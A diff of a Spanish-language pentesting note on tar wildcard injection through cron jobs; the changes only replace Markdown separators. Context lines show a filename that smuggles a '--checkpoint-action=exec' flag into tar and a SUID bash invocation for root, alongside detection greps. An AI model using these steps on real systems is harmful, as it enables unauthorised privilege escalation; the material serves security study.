@@ -17,7 +17,7 @@ linked:
 > [!info]
 > Comandos con expansión `*` interpretan archivos en cwd como argumentos. Si attacker controla los nombres → inyectar flags maliciosos via filenames especialmente nombrados.
 
-***
+---
 
 ## Vulnerable pattern
 
@@ -29,7 +29,7 @@ tar czf /backups/$(date +%F).tar.gz *
 
 `*` expande a TODOS los files. Si en `/opt/backup` podés crear archivos con nombres tipo `--<flag>` → se procesan como args de tar.
 
-***
+---
 
 ## Explotación tar
 
@@ -45,7 +45,7 @@ touch -- '--checkpoint-action=exec=sh shell.sh'
 /tmp/rootbash -p   # SUID bash → root
 ```
 
-***
+---
 
 ## Otros comandos vulnerables
 
@@ -62,7 +62,7 @@ touch -- '--checkpoint-action=exec=sh shell.sh'
 
 GTFOBins lista wildcard abuse: https://gtfobins.github.io/
 
-***
+---
 
 ## Detección
 
@@ -74,7 +74,7 @@ grep -rE 'cd.*\*|tar.*\*|chown.*\*|chmod.*\*' /etc/cron* /opt /usr/local/bin 2>/
 find / -writable -type d 2>/dev/null | head -20
 ```
 
-***
+---
 
 ## Notas Relacionadas
 
